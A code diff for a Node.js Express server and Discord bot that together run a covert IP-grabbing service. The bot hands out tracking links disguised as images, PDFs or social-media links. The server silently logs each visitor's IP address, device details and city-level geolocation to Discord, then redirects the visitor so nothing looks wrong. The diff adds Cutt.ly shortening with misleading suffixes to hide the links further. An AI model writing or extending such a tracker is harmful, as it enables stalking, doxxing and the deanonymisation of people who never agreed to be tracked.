@@ -13,7 +13,6 @@ const {
   ButtonBuilder,
   ActionRowBuilder,
   StringSelectMenuBuilder,
-  StringSelectMenuOptionBuilder,
   ButtonStyle,
   ChannelType,
   PermissionsBitField,
@@ -26,6 +25,7 @@ app.use(cors());
 const port = process.env.PORT || 3000;
 const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
 const TRACKER_BASE_URL = process.env.TRACKER_BASE_URL;
+const CUTTLY_API_KEY = process.env.CUTTLY_API_KEY;
 const CLIENTS_FILE = './clients.json';
 const deviceDetector = new DeviceDetector();
 
@@ -34,6 +34,30 @@ const maxmind = require('maxmind');
 (async () => {
   lookup = await maxmind.open('./GeoLite2-City.mmdb');
 })();
+
+// Fonction de raccourcissement via Cutt.ly
+async function shortenWithCuttly(longUrl, suffix) {
+  try {
+    const response = await axios.get('https://cutt.ly/api/api.php', {
+      params: {
+        key: CUTTLY_API_KEY,
+        short: longUrl,
+        name: suffix
+      }
+    });
+
+    const data = response.data;
+    if (data.url.status === 7) {
+      return data.url.shortLink;
+    } else {
+      console.error("Erreur Cutt.ly :", data.url.title);
+      return null;
+    }
+  } catch (err) {
+    console.error("Erreur Cutt.ly API :", err.message);
+    return null;
+  }
+}
 
 // Serveur Express
 app.get('/:type', async (req, res) => {
@@ -45,7 +69,6 @@ app.get('/:type', async (req, res) => {
   const ip = rawIp.split(',')[0].trim();
   const userAgent = req.headers['user-agent'];
   const device = deviceDetector.parse(userAgent);
-
   const geo = lookup.get(ip) || {};
 
   const embed = new EmbedBuilder()
@@ -73,20 +96,18 @@ app.get('/:type', async (req, res) => {
     console.error("Erreur Discord:", err.message);
   }
 
-  // Redirections simples
   if (['instagram', 'youtube', 'tiktok', 'facebook', 'x', 'discord'].includes(type)) {
     let url = `https://${type}.com`;
     if (type === 'x') url = `https://x.com`;
     return res.redirect(url);
   }
 
-  res.status(204).send(); // Pas de contenu pour image/pdf/video
+  res.status(204).send();
 });
 
 app.listen(port, () => {
   console.log(`🚀 Serveur Express actif sur le port ${port}`);
 });
-
 // Discord Bot
 const client = new Client({
   intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages],
@@ -169,8 +190,10 @@ client.on(Events.InteractionCreate, async interaction => {
     const baseUrl = process.env.TRACKER_BASE_URL.replace(/\/$/, '');
     const generatedUrl = `${baseUrl}/${selection}?u=${uniqueId}`;
 
-    // En attendant l'intégration Cutt.ly ➔ on utilise l'URL directe
-    const shortLink = generatedUrl;
+    // Nettoyage du suffixe pour Cutt.ly (ex : image.jpg => image-jpg)
+    const suffix = selection.replace(/\./g, '-');
+
+    const shortLink = await shortenWithCuttly(generatedUrl, suffix) || generatedUrl;
 
     await channel.send(`✅ Ton lien est prêt :\n${shortLink}`);
 
